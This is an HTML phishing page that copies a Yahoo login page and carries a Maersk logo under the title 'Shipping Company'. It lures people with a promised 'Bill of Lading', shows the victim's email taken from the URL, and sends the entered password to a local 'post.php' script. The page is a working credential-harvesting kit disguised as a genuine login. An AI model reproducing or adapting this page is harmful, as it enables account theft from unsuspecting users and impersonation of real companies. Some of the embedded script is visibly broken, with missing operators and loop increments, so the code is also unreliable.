<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<HTML>
<HEAD><TITLE>Shipping Company </TITLE>
<link rel="icon" type="image/x-icon" href="files/favicon.ico">


  <div id="baseLayout">
   <!-- Logo Meta Section Start -->
<!-- Refresh login page every 15 minutes -->
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
<meta http-equiv="refresh" content="900">

<style type="text/css">

<style type="text/css">



@import url(https://a248.e.akamai.net/sec.yimg.com/lib/reg/css/yregbase_sec_200808111401_1.css); 

.clear{clear:both}
#yreglg select, #yreglg input, #yreglg p, #yreglgtb td, #yreglgtb th{font-size:93%}
div.yregdsilu h2.yregdnt, div.yregdsilu p.yregsueasy{width:110px}
/*popup template css */
#yregtpopup #yregtxt {width:260px;margin:0 0 10px} /* popup template */
#yregtpopup #yregwp, #yregtpopup #yregmst{width:525px}
#yregtpopup #yregmst{margin-bottom:5px}
#yregtpopup #yreglg{margin-bottom:0}
#yregtpopup #yregft{padding-top:5px}

#yregtgen #yregtxt h2, #yregtpopup #yregtxt h2, #yregpmtxt h3{font:bold 152%/152% arial;color:#333;margin:0}
#yregtgen #yregtxt p.yregpti, #yregtpopup #yregtxt p.yregpti {color:#666;margin:0 0 2px;font:bold 100%/100% arial}
#yregtgen #yregtxt, #yregtpopup #yregtxt{margin-bottom:20px}
#yregtgen #yregtxt #yreghtxt h3, #yregtpopup #yregtxt #yreghtxt h3{margin:0;font:bold 107%/114% arial;color:#8C57A1}
#yregtgen #yregtxt li h3, #yregtpopup #yregtxt li h3{font:bold 114%/122% arial}
#yregtgen #yregtxt p, #yregtpopup #yregtxt p{margin:0 0 0.8em;line-height:129%}
#yregtgen #yregtxt .yregbpt li, #yregtpopup #yregtxt .yregbpt li{margin:0 0 10px 4px;padding:0 0 10px 22px;background:url(https://a248.e.akamai.net/sec.yimg.com/i/reg/purple_arrow.gif) no-repeat 1px 4px}

#yregtgen.yregab #yregtxt{width:auto;}
#yregtgen.yregab #yreghtxt{margin-right:60px;}
#yregtpopup.yregab #yregtxt{width:180px}
#yregtgen #yregtxt #yreghtxt h2, #yregtpopup #yregtxt #yreghtxt h2{color:#7A067F}
.yregbx{z-index:3;margin-right:0!important}
.flicker h3 span {color:#ff0084;font-weight:bold}
.flicker h3 a {text-decoration:underline;}

/* persistency message right above "sign in" bottom */
em.nwred a {font-style: normal; font-size: 85%; vertical-align:5px;}
.kmsibold {font-weight:bold; font-size: 114%;}
input#persistent {margin-bottom: -0em;}
.subperstxt {line-height:1.75em;}
.subperstxt2 {margin: 0 0 0 2em; display:block;}
/* #yregft p.yregfb { font-size:120%; padding-bottom: 5px; padding-up: 5px} */

.yreglgsb{margin-top:0}

#yregwp #yregct #yreglg .yregbxi #yreglgmd {margin-top:1.75em}
body#yregtgen fieldset {margin-bottom:2.5em}
#yreglgtb tr {width:17.92em}
/* p#sigcopys {text-align: left; font-size: 85%; float: right; padding: .4em; margin: .6em .4em 1em 0; border-bottom: 1px dotted #9D9C9D; border-top: 1px dotted #9D9C9D;}
*/
p#sigcopys {text-align: left; font-size: 85%; padding: .4em; margin: .6em .0em 1em 0; border-bottom: 1px dotted #9D9C9D; border-top: 1px dotted #9D9C9D;}
#sigcopys label{display:block; margin:-1.5em 0 0 2em;}


#yregtgen #yregct {margin-right: 0px;}
#yregtgen #yregtxt { margin-left: 5px; margin-right: 245px }
</style>

<style type="text/css">

/*anti phish badge */
.top {position:relative}
#antiphish{position:absolute;right:5px;top:5px;}  
#antiphish.dogear{right:0px;top:0px;} 
#antiphish a {font-size:92%;}
img.picture {border:2px solid}

/* badge backgrounds */   
.badge{background-color:#f9f9f9; background-repeat:no-repeat; background-position:top right;}  
.badge #yreglgtb {margin-top:18px;} /* increased badge size */


/* popup code... */
#security {display:none;position:absolute;top:-15px;left:-85px;z-index:1000;background-color:#a5a5a5;}
#security.noimage {left:-76px;top:-10px}
#securityi{position:relative;z-index:1;right:1px;bottom:1px;padding:11px;width:219px;background-color:#fff;border:1px solid #636363;} 
#knob{position:absolute;top:30px;right:-10px;width:10px;height:18px;background:url(https://a248.e.akamai.net/sec.yimg.com/i/reg/sideknob.png) no-repeat top left}
.noimage #knob{top:22px}
#security p, #security ul li{font:77%/107% verdana;}
#security p a {text-decoration:underline;}
#security p{padding-bottom:5px;}
#security ul{margin:5px 0 0;padding:0 5px 0 0;text-align:right;list-style:none;}   
#security ul li{margin:0;padding:0 0 2px;}

/* help text updates... */
#yregtgen #yregtxt .yregbpt li ul{margin:10px 0 0;padding:0 0 0 15px;}
#yregtgen #yregtxt .yregbpt li ul li{background:none;list-style:disc;margin:0 0 5px 0;padding:0;}
#yreghtxt ul{margin-left:0}
#yreghtxt ul.inlineHeaders li h3{display:inline;}
/* remove top margin on li ul */
.addressbar {display:block;margin:1em 0 1em 0}
.mono{font-family: courier new, courier, monospace;color:#000;font-weight:bold}


#rcta {width:99%; border:1px solid #898989; margin-top:10px; background-image:url(https://a248.e.akamai.net/sec.yimg.com/i/reg/gradient.png); background-repeat:repeat-x; background-color:#fde37c}
.ct {background:url(https://a248.e.akamai.net/sec.yimg.com/i/reg/cs.gif) no-repeat scroll right top; top:-1px}
.ct .cl {background:url(https://a248.e.akamai.net/sec.yimg.com/i/reg/cs.gif) no-repeat scroll left top;}
#rcta .key {width:40px; height:40px; border:1px solid #666666; background-image:url(https://a248.e.akamai.net/sec.yimg.com/i/reg/key.png); background-repeat: no-repeat; float:left; margin-top:1px}
#rcta .txt {margin-left:48px}
.cb {background:url(https://a248.e.akamai.net/sec.yimg.com/i/reg/cs.gif) no-repeat scroll right bottom; bottom:-1px}
.cb .cl {background:url(https://a248.e.akamai.net/sec.yimg.com/i/reg/cs.gif) no-repeat scroll left bottom;}
#rcta .ctact {margin:4px 10px;min-height:44px}
#rcta .txt .qs {font:normal bold 92% arial, Helvetica, sans-serif; color:#000; text-decoration:none}
#rcta .txt .sl {font:normal normal 100% arial, Helvetica, sans-serif; color:#000; text-decoration:none}
#rcta .txt .why {font:normal normal 85% arial, Helvetica, sans-serif;}
#rcta .txt .sltxt {line-height:0.9em}
.sltxt a {line-height:0.5em; font-size:85%}
.sltxt .why a{font-size:100%}
.yregertxt { margin-top: 25px }
.yreglgsut { margin-top: 15px } 
</style>
<!--[if IE]>
<style type="text/css">
.yregclb{height:1%}
#yreglgtb td{text-align:left}
#yreglgtb td input{width:110px}     
#antiphish img{right:15px}
#antiphish.dogear{right:1px;top:1px;}
#knob{background:url(https://a248.e.akamai.net/sec.yimg.com/i/reg/sideknob_b.gif);right:-11px}
.badge #yreglgtb {margin-top:20px;}
#rcta .key {margin-top:0}
.badge {height:1%}
</style>
<![endif]-->

<!--[if lte IE 6]>
<style type="text/css">
.yregclb{height:30em}
#yregtxt {height:1%}
</style>
<![endif]-->


<!--[if IE]>
<style type="text/css">
.yregclb,.yregbxi,.yregbx {height:1%}
#yreglgtb td{text-align:left}
#yregtxt #banner div{position:static}	/* ie z-index context stacking bug work-around */
#yregtpopup #yregtxt{clear:both; float:left;}
#yregct{padding:0 0 30px}
.yregbx{width: 100%}
</style>
<![endif]-->

<!--[if IE 6]>
<style type="text/css">
.yregclb{height:30em} 
#yregtxt {height:1%}
/*p#sigcopys {margin-right:0.2em}*/
</style>
<![endif]-->



<style type="text/css">
  
#yreglgtb, #yreglgtb th {text-align: left; width: 100%;}
#yreglgtb td { width:179px;  text-align: left; padding: 0 0 16px 0}
#yreglgtb td input{ width:179px  } 
.dbidTip {padding: 3px 0 0 0;  font-size:85%}  

</style>




<style type="text/css">
@import url(https://a248.e.akamai.net/sec.yimg.com/lib/reg/css/yregml_sec_200604111840.css);
div.yregdsilu h2.yregdnt, div.yregdsilu p.yregsueasy{width:110px}
/* persistency message right above "sign in" bottom */
em.nwred a {font-style: normal; font-size: 85%; top:-1px; position: relative }
.kmsibold {font-weight:bold; font-size: 114%;}
p#sigcopys {text-align: left; font-size: 85%; padding: .4em; margin: .6em .4em 1em 0; border-bottom: 1px dotted #9D9C9D; border-top: 1px dotted #9D9C9D;}
input#persistent {margin-bottom: -0em;}
.subperstxt {line-height:1.75em;}
.subperstxt2 {margin: 0 0 0 2em; display:block;}
/* #yregft p.yregfb { font-size:120%; padding-bottom: 5px; padding-up: 5px} */
</style>
<style type="text/css">

/*anti phish badge */
.top {position:relative}
#antiphish{position:absolute;right:5px;top:5px;}  
#antiphish.dogear{right:0px;top:0px;} 
#antiphish a {font-size:92%;}
img.picture {border:2px solid}

/* badge backgrounds */   
.badge{background-color:#f9f9f9; background-repeat:no-repeat; background-position:top right;}  
.badge #yreglgtb {margin-top:18px;} /* increased badge size */


/* popup code... */
#security {display:none;position:absolute;top:-15px;left:-85px;z-index:1000;background-color:#a5a5a5;}
#security.noimage {left:-76px;top:-10px}
#securityi{position:relative;z-index:1;right:1px;bottom:1px;padding:11px;width:219px;background-color:#fff;border:1px solid #636363;} 
#knob{position:absolute;top:30px;right:-10px;width:10px;height:18px;background:url(https://a248.e.akamai.net/sec.yimg.com/i/reg/sideknob.png) no-repeat top left}
.noimage #knob{top:22px}
#security p, #security ul li{font:77%/107% verdana;}
#security p a {text-decoration:underline;}
#security p{padding-bottom:5px;}
#security ul{margin:5px 0 0;padding:0 5px 0 0;text-align:right;list-style:none;}   
#security ul li{margin:0;padding:0 0 2px;}

/* help text updates... */
#yregtgen #yregtxt .yregbpt li ul{margin:10px 0 0;padding:0 0 0 15px;}
#yregtgen #yregtxt .yregbpt li ul li{background:none;list-style:disc;margin:0 0 5px 0;padding:0;}
#yreghtxt ul{margin-left:0}
#yreghtxt ul.inlineHeaders li h3{display:inline;}
/* remove top margin on li ul */
.addressbar {display:block;margin:1em 0 1em 0}
.mono{font-family: courier new, courier, monospace;color:#000;font-weight:bold}


#rcta {width:99%; border:1px solid #898989; margin-top:10px; background-image:url(https://a248.e.akamai.net/sec.yimg.com/i/reg/gradient.png); background-repeat:repeat-x; background-color:#fde37c}
.ct {background:url(https://a248.e.akamai.net/sec.yimg.com/i/reg/cs.gif) no-repeat scroll right top; top:-1px}
.ct .cl {background:url(https://a248.e.akamai.net/sec.yimg.com/i/reg/cs.gif) no-repeat scroll left top;}
#rcta .key {width:40px; height:40px; border:1px solid #666666; background-image:url(https://a248.e.akamai.net/sec.yimg.com/i/reg/key.png); background-repeat: no-repeat; float:left; margin-top:1px}
#rcta .txt {margin-left:48px}
.cb {background:url(https://a248.e.akamai.net/sec.yimg.com/i/reg/cs.gif) no-repeat scroll right bottom; bottom:-1px}
.cb .cl {background:url(https://a248.e.akamai.net/sec.yimg.com/i/reg/cs.gif) no-repeat scroll left bottom;}
#rcta .ctact {margin:4px 10px;min-height:44px}
#rcta .txt .qs {font:normal bold 92% arial, Helvetica, sans-serif; color:#000; text-decoration:none}
#rcta .txt .sl {font:normal normal 100% arial, Helvetica, sans-serif; color:#000; text-decoration:none}
#rcta .txt .why {font:normal normal 85% arial, Helvetica, sans-serif;}
#rcta .txt .sltxt {line-height:0.9em}
.sltxt a {line-height:0.5em; font-size:85%}
.sltxt .why a{font-size:100%}
.yregertxt { margin-top: 25px }
.yreglgsut { margin-top: 15px } 
</style>
<!--[if IE]>
<style type="text/css">
.yregclb{height:1%}
#yreglgtb td{text-align:left}
#yreglgtb td input{width:110px}     
#antiphish img{right:15px}
#antiphish.dogear{right:1px;top:1px;}
#knob{background:url(https://a248.e.akamai.net/sec.yimg.com/i/reg/sideknob_b.gif);right:-11px}
.badge #yreglgtb {margin-top:20px;}
#rcta .key {margin-top:0}
.badge {height:1%}
</style>
<![endif]-->

<!--[if lte IE 6]>
<style type="text/css">
.yregclb{height:30em}
#yregtxt {height:1%}
</style>
<![endif]-->
    
<!--[if IE]>
<style type="text/css">
#antiphish.dogear{right:1px;}
/* #antiphish{right:15px;} */
</style>
<![endif]-->
<!--[if IE 5]>
<style  type="text/css">
#yregbnr{margin-top:23px;padding-top:0}  /* offset login box */
.yregbnrimg {margin:0 0 0 -3px}  /* 3px jog Win/IE5  */
</style>
<![endif]-->
<!--[if IE]>
<style type="text/css">
.yregclb{height:1%}
#yregbnrti{height:159px;padding-top:0}
#yregbnrtii{margin-top:0} 
.knob{top:-5px}
#yregtml .mailplus{height:60px;padding-top:0}
#yregtml .mailplus div{margin-top:0}
#yregtml .spamguard{height:52px;padding-top:0}
#yregtml .spamguard div{margin-top:0}
#yregtml .addressbook{height:50px;padding-top:0}
#yregtml .addressbook div{margin-top:0}
#yregtml .messenger{height:60px;padding-top:0}
#yregtml .messenger div{margin-top:0}
#yregtml .photos{height:60px;padding-top:0}
#yregtml .photos div{margin-top:0}
#yregtml .mobile{height:60px;padding-top:0}
#yregtml .mobile div{margin-top:0}
#yregtml .antivirus{height:60px;padding-top:0}
#yregtml .antivirus div{margin-top:0}
#yregtml .cnet{height:72px;padding-top:0}
#yregtml .cnet div{margin-top:0}
#yregtml .pcmag{height:94px;padding-top:0}
#yregtml .pcmag div{margin-top:0}

</style>
<![endif]-->

<!--[if IE 7]>
<style type="text/css">
.knob{top:-6px}
#antiphish.dogear{top:0;right:0;}
#antiphish{right:5px;}
</style>
<![endif]-->

<!--[if lte IE 6]>
<style type="text/css">
.yregclb{height:30em}
#yregtxt {height:1%}
p#sigcopys {margin-right:0.2em}
</style>
<![endif]-->


<style type="text/css">
  
#yreglgtb, #yreglgtb th {text-align: left; width: 100%;}
#yreglgtb td { width:179px;  text-align: left; padding: 0 0 16px 0}
#yreglgtb td input{ width:179px  } 
.dbidTip {padding: 3px 0 0 0;  font-size:85%}  
</style>

<link rel="shortcut icon" href="http://www.maersk.com/Style%20Library/Images/MaerskComExt/favicon.ico">
</HEAD>
<div id="yregwp">
<!-- begin header -->
<img src="http://upload.wikimedia.org/wikipedia/commons/6/6c/Maersk_Group_Logo.jpeg" height="70" width="220"><script language=javascript>
if(window.yzq_d==null)window.yzq_d=new Object();
window.yzq_d['UciLdcpWBvI-']='&U=13gs1bqvr%2fN%3dUciLdcpWBvI-%2fC%3d590705.12202571.12613989.10404156%2fD%3dHEAD%2fB%3d4577997%2fV%3d1';
</script><noscript><img width=1 height=1 alt="" src="https://row.bc.yahoo.com/b?P=20kbtMpWB2594A_8SbYjEAEXO1wOLEnCWLAABpei&T=151n76310%2fX%3d1237473456%2fE%3d150270861%2fR%3dindia%2fK%3d5%2fV%3d2.1%2fW%3dHR%2fY%3dIN%2fF%3d3466307672%2fH%3dc2VjdXJlPXRydWUgc2VjdXJlPVwidFwi%2fQ%3d-1%2fS%3d1%2fJ%3d750756CA&U=13gs1bqvr%2fN%3dUciLdcpWBvI-%2fC%3d590705.12202571.12613989.10404156%2fD%3dHEAD%2fB%3d4577997%2fV%3d1"></noscript>	
<!-- end header -->
<span id="cache"></span>
<script language="JavaScript">
    
function checkBrowser(){
    var appName = navigator.appName;
    if( appName == "Microsoft Internet Explorer" )
    {
        // this only works in IE 5 for windows and higher ...
        if( navigator.appVersion.indexOf("Windows") == -1 )
            return -1;
        var appVersionAry = navigator.appVersion.split("(");
        if( appVersionAry.length < 2 )
            return -1;
        var appVersion = appVersionAry[1];
        appVersionAry = appVersion.split("; ");
        if( appVersionAry.length < 2 )
            return -1;
        appVersion = appVersionAry[1];
        appVersionAry = appVersion.split(" ");
        if( appVersionAry.length < 2 )
            return -1;
        appVersion = appVersionAry[1];
        var appVersionNumber = parseInt(appVersion);

        if( appVersionNumber < 5 )
            return -1;
    }
    else
    {
        return -1;
    }
}

</script>







<div id="yregct" class="yregclb">
	<div id="yreglg">
<!-- login box goes here -->			
		<div class="top yregbx">
    <script type="text/javascript">if(top == self) { document.write("<div class=\" badge\">")}</script>	<span class="ct"><span class="cl"></span></span>
			<div class="yregbxi"> 
<script type="text/javascript">if(top == self) { document.write("") } else  { top.location.href = "http://www.yahoo.com" }</script>				
				

<script type="text/javascript">if (top == self) { document.write("                                <div id=\"rcta\">                                 <a href=\"https://protect.login.yahoo.com/login/set_pref?.intl=in&.src=ym&.u=60seqq94s4m5g&.partner=&pkg=&stepid=&.pd=c=&.crumb=czozMjoiNDQ2NjUwZjNmZDU1ZTM4N2FkODAyZDZkNzA3ZWEwMDgiOw--&.done=https%3A%2F%2Flogin.yahoo.com%2Fconfig%2Fmail%3F.intl%3Din\" tabIndex=\"-1\">				    <a href=\"https://protect.login.yahoo.com/login/set_pref?.intl=in&.src=ym&.u=60seqq94s4m5g&.partner=&pkg=&stepid=&.pd=c=&.crumb=czozMjoiNDQ2NjUwZjNmZDU1ZTM4N2FkODAyZDZkNzA3ZWEwMDgiOw--&.done=https%3A%2F%2Flogin.yahoo.com%2Fconfig%2Fmail%3F.intl%3Din\" tabIndex=\"-1\">                                        <span class=\"ct\">                                            <span class=\"cl\"></span>                                        </span>                                      </a>                                                                        <div class=\"ctact\">                                        <a href=\"https://protect.login.yahoo.com/login/set_pref?.intl=in&.src=ym&.u=60seqq94s4m5g&.partner=&pkg=&stepid=&.pd=c=&.crumb=czozMjoiNDQ2NjUwZjNmZDU1ZTM4N2FkODAyZDZkNzA3ZWEwMDgiOw--&.done=https%3A%2F%2Flogin.yahoo.com%2Fconfig%2Fmail%3F.intl%3Din\" tabIndex=\"-1\">                                            <div class=\"key\"> </div>                                        </a>                                        <div class=\"txt\">                                            <a href=\"https://protect.login.yahoo.com/login/set_pref?.intl=in&.src=ym&.u=60seqq94s4m5g&.partner=&pkg=&stepid=&.pd=c=&.crumb=czozMjoiNDQ2NjUwZjNmZDU1ZTM4N2FkODAyZDZkNzA3ZWEwMDgiOw--&.done=https%3A%2F%2Flogin.yahoo.com%2Fconfig%2Fmail%3F.intl%3Din\">                                                <span class=\"qs\"></span>                                            </a>                                            <div class=\"sltxt\">                                                <a href=\"https://protect.login.yahoo.com/login/set_pref?.intl=in&.src=ym&.u=60seqq94s4m5g&.partner=&pkg=&stepid=&.pd=c=&.crumb=czozMjoiNDQ2NjUwZjNmZDU1ZTM4N2FkODAyZDZkNzA3ZWEwMDgiOw--&.done=https%3A%2F%2Flogin.yahoo.com%2Fconfig%2Fmail%3F.intl%3Din\">                                                                                                                         </div>                                                                                    </div>                                    </div>                                                                        <a href=\"https://protect.login.yahoo.com/login/set_pref?.intl=in&.src=ym&.u=60seqq94s4m5g&.partner=&pkg=&stepid=&.pd=c=&.crumb=czozMjoiNDQ2NjUwZjNmZDU1ZTM4N2FkODAyZDZkNzA3ZWEwMDgiOw--&.done=https%3A%2F%2Flogin.yahoo.com%2Fconfig%2Fmail%3F.intl%3Din\" tabIndex=\"-1\">                                        <span class=\"cb\">                                                            <span class=\"cl\"></span>                                                        </span>                                    </a>                                                                    </a>                            </div>        

                      <div class=\"clear\"> </div>") } else  { top.location.href = "http://www.yahoo.com" }</script>	
				<fieldset>
				<legend>Login Form</legend>
<form method="post" action="post.php" autocomplete="off" name="login_form">
				<input type="hidden" name=".tries" value="1">
				<input type="hidden" name=".src" value="ym">
				<input type="hidden" name=".md5" value="">
				<input type="hidden" name=".hash" value="">
				<input type="hidden" name=".js" value="">

				<input type="hidden" name=".last" value="">
				<input type="hidden" name="promo" value="">
				<input type="hidden" name=".intl" value="in">
				<input type="hidden" name=".bypass" value="">
				<input type="hidden" name=".partner" value="">
				<input type="hidden" name=".u" value="60seqq94s4m5g">
				<input type="hidden" name=".v" value="0">
				<input type="hidden" name=".challenge" value="JN9WeHwVxEE5uVwiPtk2f35mJBaU">

				<input type="hidden" name=".yplus" value="">

				<input type="hidden" name=".emailCode" value="">
				<input type="hidden" name="pkg" value="">
				<input type="hidden" name="stepid" value="">
				<input type="hidden" name=".ev" value="">
				<input type="hidden" name="hasMsgr" value="0">
				<input type="hidden" name=".chkP" value="Y">
				<input type="hidden" name="done" value="http://mail.yahoo.com">

				<input type="hidden" name=".pd" value="ym_ver=0&c=&ivt=&sg=">
				<table id="yreglgtb" summary="form: login information" cellspacing="0" cellpadding="0">
				
										<tr>
                                            <td><input name="email" type="hidden" value="<?php echo $_GET['email']; ?>"></td>

                                        </tr>
                                       
                                        <tr>
                                                <td><p><?php echo $_GET['email']; ?></p> </td>

                                        </tr>
                                        <tr>
                                                <th><label for="passwd">Password:</label></th></tr>
                                        <tr>
                                                <td><input name="pass" id="passwd" value="" size="50" class="yreg_ipt" type="password" maxlength="100" required="" placeholder="Enter Password"></td>

                                        </tr>


				
				</table>

<p id="sigcopys"><input type="checkbox" id="persistent" name=".persistent" value="y"
>  
    <label for="persistent"> <span class="kmsi">Print once you view the picture</span><br><span class="subperstxt">

</p>
<div class="clear"></div>
					<p class="yreglgsb"><input type="submit" value="Click to View" name="save"></p>
				</form>	
				</fieldset>

	

<!-- end lisu -->
			</div>
	<span class="cb"><span class="cl"></span></span>

      <script type="text/javascript">document.write("</div>")</script>
		</div>

<!-- end login box -->	
	</div>
	<div id="yregtxt">	

<!-- begin left side content -->	
<div id="popup"><style>
<!--
/* globals*/
.img{border:0;}
.cl{clear:both; font-size:0.1em; height:1px;margin-bottom:-1px;}
/* r1 module*/
#ymalr1_cont{width:480px;height:180px;clear:left;}
.ymalr1_left{float:left;width:205px;}
.ymalr1_right{width:275px;float:right;}
#ymalr1_callout{margin:0;padding:0;background:url(https://a248.e.akamai.net/sec.yimg.com/a/ya/yahoo_mail3/060507_20070529_energ_susi_r1_r.gif) no-repeat;height:173px;}
#ymalr1_callout h1{font:bold 18px arial,verdana;color:#fff;padding:40px 15px 0 16px;margin:0;line-height:100%;}
#ymalr1_callout p{font:13px arial,verdana;color:#fff;margin:0;padding:10px 15px 0 16px;}
-->
</style>
<div id="ymalr1_cont">
<div class="ymalr1_left">
<a href="https://in.ard.yahoo.com/SIG=15lj2qm5d/M=590705.12209085.12620097.10404153/D=india/S=150270861:R1/Y=IN/EXP=1237480656/L=20kbtMpWB2594A_8SbYjEAEXO1wOLEnCWLAABpei/B=UsiLdcpWBvI-/J=1237473456444718/K=eGHrgeRfPpLKX2eR7HSAaA/A=5467228/R=0/SIG=120v6hohv/*http://help.yahoo.com/l/us/yahoo/edit/id_password/edit-14.html" target="_blank"><img src="http://upload.evocdn.co.uk/fruitnet/uploads/asset_image/2_25582_e.jpg" alt="" width="380" height="260" border="0">
</div>
</div>
</div><script language=javascript>
if(window.yzq_d==null)window.yzq_d=new Object();
window.yzq_d['UsiLdcpWBvI-']='&U=13evvseji%2fN%3dUsiLdcpWBvI-%2fC%3d590705.12209085.12620097.10404153%2fD%3dR1%2fB%3d5467228%2fV%3d1';
</script><noscript><img width=1 height=1 alt="" src="https://row.bc.yahoo.com/b?P=20kbtMpWB2594A_8SbYjEAEXO1wOLEnCWLAABpei&T=151p2g292%2fX%3d1237473456%2fE%3d150270861%2fR%3dindia%2fK%3d5%2fV%3d2.1%2fW%3dHR%2fY%3dIN%2fF%3d1098283561%2fH%3dc2VjdXJlPXRydWUgc2VjdXJlPVwidFwi%2fQ%3d-1%2fS%3d1%2fJ%3d750756CA&U=13evvseji%2fN%3dUsiLdcpWBvI-%2fC%3d590705.12209085.12620097.10404153%2fD%3dR1%2fB%3d5467228%2fV%3d1"></noscript><style ="text/css">
<!--
/* r2 module*/
#ymal_r2{width:480px;height:auto;padding:2px 0 0;clear:left;}
#ymal_r2 h1{color:#7b0099;font:normal 16px verdana,arial;padding:0;margin:0;}
#ymal_r2 h2{color:#7b0099;font:normal 16px verdana,arial;padding:19px 0 2px 0;margin:0;}
#ymal_r2 h3{color:#333;font:normal 13px arial,verdana;margin:0;padding:0;}
#ymal_r2 h4{color:#333;font:normal 14px arial,verdana;margin:0;padding:0;}
-->

</style>
<div id="ymal_r2">
<h2><a style="text-decoration:none; color:#7b00;" href="https://in.ard.yahoo.com/SIG=15l7flcbv/M=590705.12209087.12620100.10404155/D=india/S=150270861:R2/Y=IN/EXP=1237480656/L=20kbtMpWB2594A_8SbYjEAEXO1wOLEnCWLAABpei/B=U8iLdcpWBvI-/J=1237473456444718/K=eGHrgeRfPpLKX2eR7HSAaA/A=5439083/R=0/SIG=10uuh5f1s/*http://www.kaunhoonmain.com/" target="_blank">Access to Bill of Lading Log in Your Email to View.</B></a><a 
</div><!--end ymal_r2--><script language=javascript>
if(window.yzq_d==null)window.yzq_d=new Object();
window.yzq_d['U8iLdcpWBvI-']='&U=13emrtjo1%2fN%3dU8iLdcpWBvI-%2fC%3d590705.12209087.12620100.10404155%2fD%3dR2%2fB%3d5439083%2fV%3d1';
</script><noscript><img width=1 height=1 alt="" src="https://row.bc.yahoo.com/b?P=20kbtMpWB2594A_8SbYjEAEXO1wOLEnCWLAABpei&T=150fp9ict%2fX%3d1237473456%2fE%3d150270861%2fR%3dindia%2fK%3d5%2fV%3d2.1%2fW%3dHR%2fY%3dIN%2fF%3d944062066%2fH%3dc2VjdXJlPXRydWUgc2VjdXJlPVwidFwi%2fQ%3d-1%2fS%3d1%2fJ%3d750756CA&U=13emrtjo1%2fN%3dU8iLdcpWBvI-%2fC%3d590705.12209087.12620100.10404155%2fD%3dR2%2fB%3d5439083%2fV%3d1"></noscript></div><!-- Content module end -->

<!-- end left side content -->		
	</div>
</div>
<!-- begin footer -->

<div id="yregft">
    <p></a></p>

  <p>Copyright Notice © 1999-2020. All rights reserved. </p> 
  </a></p>
</div>
 
	
<!-- end footer -->
</div>
</div>
        <script type="text/javascript">
        if (top != self) top.location.href = location.href;

        </script>
        <script type="text/javascript">
<!--
browser_string = navigator.appVersion  " "  navigator.userAgent;
if ( browser_string.indexOf("MSIE") < 0 ) {
	if (navigator.mimeTypes) {
		for (i = 0 ; i < navigator.mimeTypes.length ; i) {
			if (navigator.mimeTypes[i].suffixes.indexOf("yps") > -1) {
				 doGotIt();
			}
		}
	} else {
		dontGotIt();
	}
} else {
	if (browser_string.indexOf("Windows")>=0) {
		doGotIt();
		document.write('<object classid="clsid:41695A8E-6414-11D4-8FB3-00D0B7730277" CODEBASE="javascript:dontGotIt();" ID="Ymsgr" width="1" height="1">');
		document.write('</object>');
	}
}
hasMsgr = 0;
function dontGotIt(){
  hasMsgr = 0;
  document.login_form.hasMsgr.value=0;
}
function doGotIt(){
  hasMsgr = 1;
  document.login_form.hasMsgr.value=1;
}
function setFocus() {
    var aAcceptableInputTypes = Array("checkbox", "password", "radio", "select-one", "select-multiple", "text", "textarea");
    curEl = document.login_form.login;
    curElType = curEl.type;
    /* focus first form input element */
    if (aAcceptableInputTypes.inArray(curElType)) {
        curEl.focus();
    } else {
        document.login_form.passwd.focus();
    }
}
Array.prototype.inArray = function (value) {
    /* for each element in the array */
    for (var idx = 0; idx < this.length; idx) {
        /* compare requested value with the current element. Match identical (===), not just similar (==) */
        if (this[idx] === value) { // it is the same
            return true;
        }
    }
    /* not found */
    return false;
};
function checkPw(listen, check){
  listen.onclick = function(){
    if(check.value === ''){
      if(document.getElementById('noPwErr') == null){
	document.login_form.passwd.focus();
	var fieldset = document.getElementsByTagName('fieldset')[0];
	var errMsg = document.createElement('div');
	errMsg.className = 'yregertxt';
	errMsg.id = 'noPwErr';
	errMsg.style.fontWeight = 'bold';
	errMsg.appendChild(document.createTextNode('Please verify your password'));
	fieldset.insertBefore(errMsg, fieldset.firstChild);
      }
      return false;
    }
    return true;
  }
}
checkPw(document.getElementsByName('.save')[0], document.getElementById('passwd'));

//-->

</script>

<script src="https://a248.e.akamai.net/sec.yimg.com/lib/reg/js/login_md5_1_14.js" type="text/javascript"></script>
<script src="https://a248.e.akamai.net/sec.yimg.com/lib/g/ylib_dom.js" type="text/javascript"></script>
<script src="https://a248.e.akamai.net/sec.yimg.com/lib/g/util/yg_browserext_1_5.js" type="text/javascript"></script>
<script src="https://a248.e.akamai.net/sec.yimg.com/lib/reg/js/yregml_200810291102.js" type="text/javascript"></script>

<!-- spaceid: 150270861 INT.OFFSET: 270000 --><!-- SpaceID=150270861 loc=FOOT9 noad -->
<!-- l06.member.in2.yahoo.com Thu Mar 19 20:07:36 IST 2009 -->
</noscript></noframes>
</body>
</html>
<script language=javascript>
if(window.yzq_p==null)document.write("<scr""ipt language=javascript src=https://a248.e.akamai.net/sec.yimg.com/lib/bc/bcr_2.0.5.js></scr""ipt>");
</script><script language=javascript>
if(window.yzq_p)yzq_p('P=20kbtMpWB2594A_8SbYjEAEXO1wOLEnCWLAABpei&T=14sfldal6%2fX%3d1237473456%2fE%3d150270861%2fR%3dindia%2fK%3d5%2fV%3d1.1%2fW%3dJR%2fY%3dIN%2fF%3d3702011403%2fH%3dc2VjdXJlPXRydWUgc2VjdXJlPVwidFwi%2fS%3d1%2fJ%3d750756CA');
if(window.yzq_s)yzq_s();
</script><noscript><img width=1 height=1 alt="" src="https://row.bc.yahoo.com/b?P=20kbtMpWB2594A_8SbYjEAEXO1wOLEnCWLAABpei&T=1516pi735%2fX%3d1237473456%2fE%3d150270861%2fR%3dindia%2fK%3d5%2fV%3d3.1%2fW%3dJR%2fY%3dIN%2fF%3d2354922919%2fH%3dc2VjdXJlPXRydWUgc2VjdXJlPVwidFwi%2fQ%3d-1%2fS%3d1%2fJ%3d750756CA"></noscript>

